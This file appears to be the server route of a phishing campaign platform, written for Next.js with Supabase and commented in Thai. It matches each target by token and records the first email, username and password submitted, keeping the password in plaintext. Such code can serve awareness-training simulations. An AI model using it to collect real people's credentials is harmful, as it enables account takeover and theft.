//app/api/submit/route.ts
import { NextRequest, NextResponse } from "next/server";
import { createClient } from "@supabase/supabase-js";



export async function POST(req: NextRequest) {
  const body = await req.json().catch(() => ({}));
  const supabase = createClient(
    process.env.SUPABASE_URL!,
    process.env.SUPABASE_SERVICE_ROLE_KEY!
  );

  const token = String(body.token || "");
  const submitted_email = body.submitted_email ? String(body.submitted_email) : null;
  const submitted_username = body.submitted_username ? String(body.submitted_username) : null;
  const submitted_password = body.submitted_password ? String(body.submitted_password) : null;

  if (!token) {
    return NextResponse.json({ error: "Missing token" }, { status: 400 });
  }

  const { data, error } = await supabase
    .from("campaign_targets")
    .select("id, submitted_at")
    .eq("token", token)
    .maybeSingle();

  if (error) {
    return NextResponse.json({ error: "DB error" }, { status: 500 });
  }
  if (!data) {
    return NextResponse.json({ error: "Invalid token" }, { status: 404 });
  }

  // ✅ platform มาตรฐาน: บันทึกแค่ครั้งแรก (ไม่ให้ทับ)
  if (!data.submitted_at) {
    await supabase
      .from("campaign_targets")
      .update({
        submitted_at: new Date().toISOString(),
        submitted_email,
        submitted_username,
        submitted_password,
      })
      .eq("id", data.id);

    return NextResponse.json({ ok: true, recorded: true });
  }

  // submit ซ้ำ → ไม่บันทึกทับ
  return NextResponse.json({ ok: true, recorded: false, reason: "already_submitted" });
}
